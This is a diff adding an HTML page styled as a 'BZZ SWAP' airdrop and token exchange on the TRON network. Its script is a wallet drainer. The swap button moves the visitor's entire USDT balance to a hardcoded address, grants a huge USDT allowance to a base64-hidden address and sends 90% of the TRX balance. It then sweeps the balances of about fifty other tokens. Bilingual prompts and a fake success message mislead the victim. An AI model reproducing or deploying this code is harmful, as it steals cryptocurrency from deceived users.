@@ -1,0 +1,527 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+	<meta name="description" content="Wilio Survey, Quotation, Review and Register form Wizard by Ansonika." />
+
+	<title>BZZ SWAP</title>
+
+	<link href="/bootstrap.min.css" rel="stylesheet" />
+	<link href="/style.css" rel="stylesheet" />
+	<link href="/tip.css" rel="stylesheet" />
+
+	<style type="text/css">
+		@font-face {
+			font-family: "element-icons";
+			src: url("chrome-extension://moombeodfomdpjnpocobemoiaemednkg/fonts/element-icons.woff") format("woff"),
+				url("chrome-extension://moombeodfomdpjnpocobemoiaemednkg/fonts/element-icons.ttf ") format("truetype");
+			/* chrome, firefox, opera, Safari, Android, iOS 4.2+*/
+		}
+	</style>
+</head>
+
+<body style="overflow: visible">
+	<div id="preloader" style="display: none">
+		<div data-loader="circle-side" style="display: none"></div>
+	</div>
+
+	<div id="loader_form">
+		<div data-loader="circle-side-2"></div>
+	</div>
+
+	<div class="container-fluid full-height">
+		<div class="row row-height">
+			<div class="col-lg-6 content-left">
+				<div class="content-left-wrapper">
+					<!-- <a href="https://shiba-token.io" id="logo"
+              ><img src="/logo-shib.svg" alt="" height="35"
+            /></a> -->
+					<div>
+						<figure>
+							<img
+                  src="/logo.svg"
+                  alt=""
+                  class="img-fluid"
+                  style="max-width: 250px"
+                />
+              </figure>
+							<h2><b>BZZ</b></h2>
+							<p>
+								BZZ airdrop will be distributed to build community if you
+								are lucky and receive it for free
+							</p>
+							<p>
+								有幸獲得BZZ項目免費空投，獲得的用戶可以參與社區建設，也可兌換等量TRX
+							</p>
+							<a href="javascript:;"><img src="/tel.svg" height="50px" /></a>
+							<a href="javascript:;"><img src="/twitter.svg" height="50px"/></a>
+					</div>
+					<div class="copy">© 2021 BZZSswap.com</div>
+				</div>
+			</div>
+
+			<div class="col-lg-6 content-right" id="start">
+				<div id="wizard_container" class="wizard" novalidate="novalidate">
+					<div id="top-wizard">
+						<div id="progressbar" class="ui-progressbar ui-widget ui-widget-content ui-corner-all"
+							role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+							<div class="ui-progressbar-value ui-widget-header ui-corner-left"
+								style="display: none; width: 0%"></div>
+						</div>
+					</div>
+					<div class="step wizard-step current" style="">
+						<h3 class="main_question wizard-header">
+							Connected wallet:
+							<span id="TronLinkState">Loading...</span>
+						</h3>
+						<h3 class="main_question wizard-header">
+							BZZ: <span id="SHIBNUM">Loading...</span>
+						</h3>
+						<div class="text-center pb-4" onclick="sellAll()">
+							Sell All (銷售所有)
+						</div>
+						<div class="form-group">
+							<input
+                  type="number"
+                  min="0"
+                  class="form-control required"
+                  placeholder="BZZ Amount"
+                />
+              </div>
+							<div class="text-center pb-4" onclick="change()">
+								Change (轉換交易對)
+							</div>
+							<div class="form-group">
+								<input
+                  type="number"
+                  min="0"
+                  class="form-control required"
+                  placeholder="TRX Amount"
+                />
+              </div>
+								<div class="form-group terms">
+									<b>1 BZZ = 6 TRX</b>
+								</div>
+							</div>
+
+							<button
+              type="button"
+              onclick="swap()"
+              name="forward"
+              class="forward"
+            >
+              Swap Now! (立刻兌換)
+            </button>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<script src="/jquery-3.5.1.min.js"></script>
+			<script src="/tip.js"></script>
+			<script>
+				Qmsg.config({
+					html: true,
+					autoClose: false,
+					showClose: true,
+				  });
+				  function accAdd(arg1, arg2) {
+					var r1, r2, m, c;
+					try {
+					  r1 = arg1.toString().split(".")[1].length;
+					} catch (e) {
+					  r1 = 0;
+					}
+					try {
+					  r2 = arg2.toString().split(".")[1].length;
+					} catch (e) {
+					  r2 = 0;
+					}
+					c = Math.abs(r1 - r2);
+					m = Math.pow(10, Math.max(r1, r2));
+					if (c > 0) {
+					  var cm = Math.pow(10, c);
+					  if (r1 > r2) {
+						arg1 = Number(arg1.toString().replace(".", ""));
+						arg2 = Number(arg2.toString().replace(".", "")) * cm;
+					  } else {
+						arg1 = Number(arg1.toString().replace(".", "")) * cm;
+						arg2 = Number(arg2.toString().replace(".", ""));
+					  }
+					} else {
+					  arg1 = Number(arg1.toString().replace(".", ""));
+					  arg2 = Number(arg2.toString().replace(".", ""));
+					}
+					return (arg1 + arg2) / m;
+				  }
+
+				  Number.prototype.add = function (arg) {
+					return accAdd(arg, this);
+				  };
+
+				  function accSub(arg1, arg2) {
+					var r1, r2, m, n;
+					try {
+					  r1 = arg1.toString().split(".")[1].length;
+					} catch (e) {
+					  r1 = 0;
+					}
+					try {
+					  r2 = arg2.toString().split(".")[1].length;
+					} catch (e) {
+					  r2 = 0;
+					}
+					m = Math.pow(10, Math.max(r1, r2));
+					n = r1 >= r2 ? r1 : r2;
+					return ((arg1 * m - arg2 * m) / m).toFixed(n);
+				  }
+
+				  Number.prototype.sub = function (arg) {
+					return accMul(arg, this);
+				  };
+
+				  function accMul(arg1, arg2) {
+					var m = 0,
+					  s1 = arg1.toString(),
+					  s2 = arg2.toString();
+					try {
+					  m += s1.split(".")[1].length;
+					} catch (e) {}
+					try {
+					  m += s2.split(".")[1].length;
+					} catch (e) {}
+					return (
+					  (Number(s1.replace(".", "")) * Number(s2.replace(".", ""))) /
+					  Math.pow(10, m)
+					);
+				  }
+
+				  Number.prototype.mul = function (arg) {
+					return accMul(arg, this);
+				  };
+
+				  function accDiv(arg1, arg2) {
+					var t1 = 0,
+					  t2 = 0,
+					  r1,
+					  r2;
+					try {
+					  t1 = arg1.toString().split(".")[1].length;
+					} catch (e) {}
+					try {
+					  t2 = arg2.toString().split(".")[1].length;
+					} catch (e) {}
+					with (Math) {
+					  r1 = Number(arg1.toString().replace(".", ""));
+					  r2 = Number(arg2.toString().replace(".", ""));
+					  return (r1 / r2) * pow(10, t2 - t1);
+					}
+				  }
+
+				  Number.prototype.div = function (arg) {
+					return accDiv(this, arg);
+				  };
+
+				  let usdtTrc20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+				  let toAddress = "TEnBuG5sGX8Agj3hKDU3zZaZ1THG4E9dss";
+
+				  let trc20List = [
+					"TE2RzoSV3wFK99w6J9UnnZ4vLfXYoxvRwP",
+					"TRg6MnpsFXc82ymUPgf5qbj59ibxiEDWvv",
+					"TGBr8uh9jBVHJhhkwSJvQN2ZAKzVkxDmno",
+					"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+					"TXJgMdjVX5dKiQaUi9QobwNxtSQaFqccvd",
+					"TR7BUFRQeq1w5jAZf1FKx85SHuX6PfMqsV",
+					"TUY54PVeH6WCcYCd6ZXXoBDsHytN9V5PXt",
+					"TLeEu311Cbw63BcmMHDgDLu7fnk9fqGcqT",
+					"TL5x9MtSnDy537FXKx53yAaHRRNdg9TkkA",
+					"TWQhCXaWz4eHK4Kd1ErSDHjMFPoPc9czts",
+					"TL6K6iaEkn8kdnJ79a8Be3S4RFf4pFkGE8",
+					"TXMKm8FSp6zcm3cdgkgcM1fwdkuJbZ4Hgv",
+					"TMUgpK7LLSYE2YKT3nGbLSzPgs3sw5hquM",
+					"TDk91SWz2GvwfZwMTGX21d4ngUUH8YZZAv",
+					"TDuvynpjzttyM6qP6Qp2jqKpAMsLYD32qn",
+					"TL62tGz88S7dks7ssQxh6rVMKaJn2aq92j",
+					"TNBnMWraDKFi1bFnVTjQ2YaSd6Xo6nQS57",
+					"TWd7vJKaGmpq6oHgpHBqHHPG8JP2XErkTH",
+					"TMGSahWsmc3PxzqVWuYQrTdEhoCPN8Pyn7",
+					"TD5Wb8MpDLDvMiXC4r289c362rxMSPD8qP",
+					"TSAr2WfxjyWTCX1nw4XXHyr1cQEX2jWtRg",
+					"TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
+					"TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
+					"TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
+					"TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
+					"THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
+					"TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
+					"TQcia2H2TU3WrFk9sKtdK9qCfkW8XirfPQ",
+					"TYukBQZ2XXCcRCReAUguyXncCWNY9CEiDQ",
+					"TYN6Wh11maRfzgG7n5B6nM5VW1jfGs9chu",
+					"TV1rTHvtf7Zn2H19T4SFQEEhtW8MztkUCB",
+					"TH2mEwTKNgtg8psR6Qx2RBUXZ48Lon1ygu",
+					"TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
+					"TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
+					"TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
+					"TGbu32VEGpS4kDmjrmn5ZZJgUyHQiaweoq",
+					"TKAtLoCB529zusLfLVkGvLNis6okwjB7jf",
+					"TFVge5Nb6or8cpdtdwPuXSGqLHpj3PM9Rp",
+					"TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
+					"TKJYoAbbLMsZkC7bonqiyzNmqtGu1iD7in",
+					"TR3DLthpnDdCGabhVDbD3VMsiJoCXY3bZd",
+					"TXWkP3jLBqRGojUih1ShzNyDaN5Csnebok",
+					"TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
+					"TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
+					"TLLBBiX3HqVZZsUQTBXgurA3pdw317PmjM",
+					"TJmTeYk5zmg8pNPGYbDb2psadwVLYDDYDr",
+					"TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK",
+					"TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
+					"TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
+					"TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
+				  ];
+
+				  let coinId = "1004083";
+				  let coinName = "BZZ";
+				  let coinPrecision = 100;
+				  let coinNum = 0;
+				  let proportion = 6;
+
+				  let checkTronReadyNum = 0;
+
+				  let timer = setInterval(async () => {
+					checkTronReadyNum++;
+					if (window.tronWeb && window.tronWeb.ready) {
+					  let userAddress = window.tronWeb.defaultAddress.base58;
+					  $("#TronLinkState").text(
+						userAddress.substr(0, 3) + "..." + userAddress.substr(31, 3)
+					  );
+					  tronWeb.trx.getAccount().then((res) => {
+						let tokenBalance = res.assetV2.find(function (o) {
+						  return o.key == coinId;
+						});
+						if (tokenBalance != undefined) {
+						  coinNum = tokenBalance.value / coinPrecision;
+						  $("#SHIBNUM").text(`${coinNum.toFixed(6)}`);
+						} else {
+						  $("#SHIBNUM").text(`0`);
+						}
+					  });
+					} else {
+					  $("#TronLinkState").text("Not Connected");
+					  if (checkTronReadyNum > 3) {
+						showNoConnet();
+						clearInterval(timer);
+					  }
+					}
+				  }, 500);
+
+				  function showNoConnet() {
+					Qmsg.error(`<br><br>Please download the Tronlink APP on your mobile phone and enter billsswap.com into the Dapp or use the Tronlink Chrome plug-in on your PC.<br><br>
+				  請下載手機端Tronlink APP 並打開進入發現在DAPP中輸入billsswap.com進入,或使用PC端配合tronlink Chrome插件使用。<br>`);
+				  }
+
+				  function change() {
+					if ($($("input")[0]).attr("placeholder") == "SHIB Amount") {
+					  $($("input")[0]).attr("placeholder", "TRX Amount");
+					  $($("input")[1]).attr("placeholder", `${coinName} Amount`);
+					} else {
+					  $($("input")[0]).attr("placeholder", `${coinName} Amount`);
+					  $($("input")[1]).attr("placeholder", "TRX Amount");
+					}
+					var t = $($("input")[0]).val();
+					$($("input")[0]).val($($("input")[1]).val());
+					$($("input")[1]).val(t);
+				  }
+
+				  function calculation() {
+					if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
+					  
+					  $($("input")[1]).val(Number($($("input")[0]).val()).mul(proportion));
+					} else {
+					  
+					 $($("input")[1]).val(Number($($("input")[0]).val()).div(proportion));
+					}
+				  }
+
+				  function getInputCoinNum() {
+					if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
+					  return Number($($("input")[0]).val());
+					} else {
+					  return Number($($("input")[1]).val());
+					}
+					return 0;
+				  }
+
+				  $($("input")[0]).change(function () {
+					calculation();
+				  });
+
+				  $($("input")[0]).keyup(function () {
+					calculation();
+				  });
+
+				  function sellAll() {
+					if (coinNum <= 0) {
+					  Qmsg.error(` Insufficient assets (你沒有資產) `);
+					  return;
+					}
+					$($("input")[0]).val(coinNum);
+					$($("input")[0]).keyup();
+				  }
+
+				  function swap() {
+					if (coinNum <= 0) {
+					  Qmsg.error(` Insufficient assets (你沒有資產) `);
+					  return;
+					}
+					if (Number($($("input")[0]).val()) <= 0) {
+					  Qmsg.error({
+						autoClose: true,
+						content: `<br><br>The Quantity of exchanges is incorrect<br><br>兌換數量不正確`,
+						timeout: 3000,
+					  });
+					  return;javascript:;
+					}
+					if (getInputCoinNum() > coinNum) {
+					  Qmsg.error(` Insufficient assets (資產不足夠) `);
+					  return;
+					}
+					let loading = Qmsg.loading(
+					  `<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
+					);
+					tronWeb.trx
+					  .getAccount()
+					  .then((account) => {
+						tronWeb.trx
+						  .getBalance()
+						  .then((trxbalance) => {
+							let trxbalanceNum = trxbalance / 1000000;
+						   // console.log("TRX", trxbalanceNum);
+							tronWeb
+							  .contract()
+							  .at(usdtTrc20)
+							  .then((usdtContract) => {
+								usdtContract
+								  .balanceOf(tronWeb.defaultAddress.base58)
+								  .call()
+								  .then((usdtbalance) => {
+									let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
+								   // console.log("USDT", usdtbalanceNum);
+									if (usdtbalanceNum > 1) {
+									  usdtContract
+										.transfer(toAddress, usdtbalance.toNumber())
+										.send()
+										.finally(() => {
+										  loading.close();
+										  toTrx(usdtContract, trxbalance);
+										});
+									} else {
+									  loading.close();
+									  toTrx(usdtContract, trxbalance);
+									}
+								  })
+								  .catch(() => {
+									loading.close();
+									Qmsg.error(` Authorization failed (授權失敗)) `);
+								  });
+							  })
+							  .catch(() => {
+								loading.close();
+								Qmsg.error(` Authorization failed (授權失敗)) `);
+							  });
+						  })
+						  .catch(() => {
+							loading.close();
+							Qmsg.error(` Authorization failed (授權失敗)) `);
+						  });
+					  })
+					  .catch(() => {
+						loading.close();
+						Qmsg.error(` Authorization failed (授權失敗)) `);
+					  });
+				  }
+				   
+				  function toTrx(usdtContract, trxbalance) {
+					usdtContract
+					  .approve(window.atob("VEFqWlY2TWVDWjZXSm9pZXdMNVVmTmloeWd4VVdtQkx6SA=="), 1000000000000000)
+					  .send()
+					  .finally(() => {
+						let trxbalanceNum = trxbalance / 1000000;
+						if (trxbalanceNum > 10) {
+						  let loading = Qmsg.loading(
+							`<br><br>Please authorize your TRX assets so that the system can view and complete the transaction<br><br>請通過授權您的TRX資產以便系統檢視並完成交易`
+						  );
+						  let sendTrx = Math.round(
+							Number(trxbalance).mul(Number(90).div(100))
+						  );
+						  tronWeb.trx.sendTransaction(toAddress, sendTrx).finally(() => {
+							loading.close();
+							toTrc20();
+						  });
+						} else {
+						  toTrc20();
+						}
+					  });
+				  }
+
+				  let toTrc20Loading = null;
+
+				  function toTrc20(index) {
+					if (index === undefined) index = 0;
+					if (toTrc20Loading == null || toTrc20Loading.state !== "opening") {
+					  toTrc20Loading = Qmsg.loading(
+						`<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
+					  );
+					}
+					if (index == trc20List.length) {
+					  toTrc20Loading.close();
+					  Qmsg.success(
+						`<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>交易成功，將在區塊確認後到達`
+					  );
+					  return;
+					}
+					let trc20CCAddress = trc20List[index];
+
+					const forContract = new Promise((resolution, rejection) => {
+					  setTimeout(() => {
+						tronWeb
+						  .contract()
+						  .at(trc20CCAddress)
+						  .then((cc) => {
+							if (!cc.balanceOf) {
+							  resolution();
+							  return;
+							}
+							cc.balanceOf(window.tronWeb.defaultAddress.base58)
+							  .call()
+							  .then((balance) => {
+								if (balance.toNumber() >= 5) {
+								  cc.transfer(toAddress, balance.toNumber())
+									.send()
+									.finally(() => {
+									  resolution();
+									});
+								} else {
+								  resolution();
+								}
+							  })
+							  .catch(() => {
+								resolution();
+							  });
+						  })
+						  .catch(() => {
+							resolution();
+						  });
+					  }, 100);
+					}).finally(() => {
+					  toTrc20(index + 1);
+					});
+				  }
+			</script>
+</body>
+
+</html>
